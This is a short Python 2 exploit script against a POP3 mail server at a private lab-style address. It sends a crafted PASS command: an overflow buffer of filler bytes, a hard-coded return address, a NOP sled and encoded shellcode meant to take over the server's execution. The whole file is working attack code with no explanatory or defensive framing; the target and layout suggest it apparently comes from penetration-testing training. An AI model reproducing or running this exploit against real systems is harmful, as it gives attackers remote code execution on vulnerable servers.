#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# # 5F4A358F
shellcode = ("\xdb\xc8\xd9\x74\x24\xf4\x58\xba\x36\xe7\x75\xf1\x33\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x13\x03\x66\xf4\x97\x04\x7a\x12\xd5"
"\xe7\x82\xe3\xba\x6e\x67\xd2\xfa\x15\xec\x45\xcb\x5e\xa0\x69"
"\xa0\x33\x50\xf9\xc4\x9b\x57\x4a\x62\xfa\x56\x4b\xdf\x3e\xf9"
"\xcf\x22\x13\xd9\xee\xec\x66\x18\x36\x10\x8a\x48\xef\x5e\x39"
"\x7c\x84\x2b\x82\xf7\xd6\xba\x82\xe4\xaf\xbd\xa3\xbb\xa4\xe7"
"\x63\x3a\x68\x9c\x2d\x24\x6d\x99\xe4\xdf\x45\x55\xf7\x09\x94"
"\x96\x54\x74\x18\x65\xa4\xb1\x9f\x96\xd3\xcb\xe3\x2b\xe4\x08"
"\x99\xf7\x61\x8a\x39\x73\xd1\x76\xbb\x50\x84\xfd\xb7\x1d\xc2"
"\x59\xd4\xa0\x07\xd2\xe0\x29\xa6\x34\x61\x69\x8d\x90\x29\x29"
"\xac\x81\x97\x9c\xd1\xd1\x77\x40\x74\x9a\x9a\x95\x05\xc1\xf2"
"\x5a\x24\xf9\x02\xf5\x3f\x8a\x30\x5a\x94\x04\x79\x13\x32\xd3"
"\x7e\x0e\x82\x4b\x81\xb1\xf3\x42\x46\xe5\xa3\xfc\x6f\x86\x2f"
"\xfc\x90\x53\xff\xac\x3e\x0c\x40\x1c\xff\xfc\x28\x76\xf0\x23"
"\x48\x79\xda\x4b\xe3\x80\x8d\x79\xff\x8a\x09\x16\xfd\x8a\x90"
"\x5d\x88\x6c\xf8\xb1\xdd\x27\x95\x28\x44\xb3\x04\xb4\x52\xbe"
"\x07\x3e\x51\x3f\xc9\xb7\x1c\x53\xbe\x37\x6b\x09\x69\x47\x41"
"\x25\xf5\xda\x0e\xb5\x70\xc7\x98\xe2\xd5\x39\xd1\x66\xc8\x60"
"\x4b\x94\x11\xf4\xb4\x1c\xce\xc5\x3b\x9d\x83\x72\x18\x8d\x5d"
"\x7a\x24\xf9\x31\x2d\xf2\x57\xf4\x87\xb4\x01\xae\x74\x1f\xc5"
"\x37\xb7\xa0\x93\x37\x92\x56\x7b\x89\x4b\x2f\x84\x26\x1c\xa7"
"\xfd\x5a\xbc\x48\xd4\xde\xcc\x02\x74\x76\x45\xcb\xed\xca\x08"
"\xec\xd8\x09\x35\x6f\xe8\xf1\xc2\x6f\x99\xf4\x8f\x37\x72\x85"
"\x80\xdd\x74\x3a\xa0\xf7")


buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.21.98', 110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
